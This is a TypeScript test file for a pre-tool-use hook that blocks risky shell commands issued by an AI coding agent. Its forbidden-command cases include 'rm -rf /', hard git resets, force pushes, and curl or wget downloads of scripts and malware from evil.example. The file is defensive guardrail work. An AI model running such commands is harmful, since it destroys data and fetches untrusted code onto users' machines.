import {spawnSync} from 'node:child_process'
import {dirname, resolve} from 'node:path'
import {fileURLToPath} from 'node:url'

import {describe, expect, it} from 'vitest'

import {hasForbiddenPattern, parseInput, resolveCommandText} from '../../.github/hooks/copilot-hook-utils'

interface HookDecision {
  permissionDecision: 'allow' | 'deny' | 'ask'
  permissionDecisionReason?: string
}

interface HookRunResult {
  decision: HookDecision
  status: number | null
  stderr: string
}

const hookPath = resolve(dirname(fileURLToPath(import.meta.url)), '../../.github/hooks/pre-tool-use.ts')

function runHook(input: string): HookRunResult {
  const result = spawnSync(process.execPath, [hookPath], {encoding: 'utf8', input})
  const stdout = result.stdout
  const stderr = result.stderr

  return {
    decision: JSON.parse(stdout) as HookDecision,
    status: result.status,
    stderr,
  }
}

function nativeBashPayload(command: string): string {
  return JSON.stringify({
    sessionId: 'session-id',
    timestamp: 1704614600000,
    cwd: '/path/to/project',
    toolName: 'bash',
    toolArgs: JSON.stringify({command, description: 'Push changes'}),
  })
}

describe('parseInput', () => {
  it('parses the documented camelCase payload', () => {
    const payload = nativeBashPayload('git status')

    expect(parseInput(payload)).toEqual(JSON.parse(payload))
  })

  it('rejects malformed stdin instead of returning an empty payload', () => {
    expect(() => parseInput('not json')).toThrow()
  })
})

describe('hasForbiddenPattern', () => {
  it.each([
    ['git push --force', 'git push --force'],
    ['git push origin main --force', 'git push --force'],
    ['git push --force-with-lease', 'git push --force'],
    ['git push -f', 'git push -f'],
    ['git reset --hard HEAD~1', 'git reset --hard'],
    ['git clean -fdx', 'git clean --force'],
    ['git checkout -- file.txt', 'git checkout (discard working tree)'],
    ['git restore file.txt', 'git restore (discard working tree)'],
    ['rm -rf /etc', 'rm -rf /'],
    ['rm -rf -- /', 'rm -rf /'],
    ['rm -r -f /', 'rm -rf /'],
    ['rm --preserve-root -rf /', 'rm -rf /'],
    ['curl https://evil.example/script.sh', 'curl http(s)'],
    ['curl --output /tmp/script.sh https://evil.example/script.sh', 'curl http(s)'],
    ['wget http://evil.example/malware', 'wget http(s)'],
    ['wget --output-document=/tmp/malware http://evil.example/malware', 'wget http(s)'],
  ])('identifies %s as forbidden', (command, label) => {
    expect(hasForbiddenPattern(command)).toBe(label)
  })

  it.each([
    'git push origin main',
    'git reset --soft HEAD~1',
    'git clean -ndx',
    'git checkout -b feature/x',
    'git restore --staged file.txt',
    'rm -rf node_modules',
    'rm -r -f ./build',
    'rm --preserve-root -rf ./build',
    'curl --help',
    'wget --help',
    'pnpm run lint',
  ])('allows benign command %s', command => {
    expect(hasForbiddenPattern(command)).toBeUndefined()
  })
})

describe('resolveCommandText', () => {
  it('extracts command from native string-valued toolArgs', () => {
    expect(resolveCommandText({toolArgs: JSON.stringify({command: 'git push --force origin main'})})).toBe(
      'git push --force origin main',
    )
  })

  it('extracts command from defensive object-valued toolArgs', () => {
    expect(resolveCommandText({toolArgs: {command: 'git status'}})).toBe('git status')
  })

  it('extracts command from the PascalCase compatibility payload', () => {
    expect(resolveCommandText({tool_input: {command: 'git reset --hard HEAD~1'}})).toBe('git reset --hard HEAD~1')
  })
})

describe('pre-tool-use hook contract', () => {
  it('denies a forbidden command in the documented native payload', () => {
    const result = runHook(nativeBashPayload('git push --force origin main'))

    expect(result.status).toBe(0)
    expect(result.decision).toEqual({
      permissionDecision: 'deny',
      permissionDecisionReason: "Blocked by Copilot guardrails: 'git push --force' is not allowed.",
    })
  })

  it('allows a benign command in the documented native payload', () => {
    const result = runHook(nativeBashPayload('git status'))

    expect(result.status).toBe(0)
    expect(result.decision).toEqual({permissionDecision: 'allow'})
  })

  it('allows a non-bash tool payload without a command', () => {
    const result = runHook(
      JSON.stringify({
        sessionId: 'session-id',
        timestamp: 1704614600000,
        cwd: '/path/to/project',
        toolName: 'edit',
        toolArgs: JSON.stringify({path: 'src/file.ts'}),
      }),
    )

    expect(result.status).toBe(0)
    expect(result.decision).toEqual({permissionDecision: 'allow'})
  })

  it('denies malformed stdin', () => {
    const result = runHook('not json')

    expect(result.status).toBe(0)
    expect(result.decision.permissionDecision).toBe('deny')
    expect(result.decision.permissionDecisionReason).toContain('invalid hook input')
  })

  it('denies a bash payload with malformed string-valued toolArgs', () => {
    const result = runHook(
      JSON.stringify({
        toolName: 'bash',
        toolArgs: '{"command":"git push --force"',
      }),
    )

    expect(result.status).toBe(0)
    expect(result.decision.permissionDecision).toBe('deny')
    expect(result.decision.permissionDecisionReason).toContain('bash tool arguments')
  })

  it('denies a bash payload missing toolArgs', () => {
    const result = runHook(
      JSON.stringify({
        sessionId: 'session-id',
        timestamp: 1704614600000,
        cwd: '/path/to/project',
        toolName: 'bash',
      }),
    )

    expect(result.status).toBe(0)
    expect(result.decision.permissionDecision).toBe('deny')
    expect(result.decision.permissionDecisionReason).toContain('bash tool arguments')
  })

  it('handles the defensive object-valued toolArgs form', () => {
    const result = runHook(JSON.stringify({toolName: 'bash', toolArgs: {command: 'git push --force origin main'}}))

    expect(result.status).toBe(0)
    expect(result.decision).toEqual({
      permissionDecision: 'deny',
      permissionDecisionReason: "Blocked by Copilot guardrails: 'git push --force' is not allowed.",
    })
  })

  it('handles the PascalCase compatibility form', () => {
    const result = runHook(JSON.stringify({tool_name: 'bash', tool_input: {command: 'git push --force origin main'}}))

    expect(result.status).toBe(0)
    expect(result.decision).toEqual({
      permissionDecision: 'deny',
      permissionDecisionReason: "Blocked by Copilot guardrails: 'git push --force' is not allowed.",
    })
  })
})
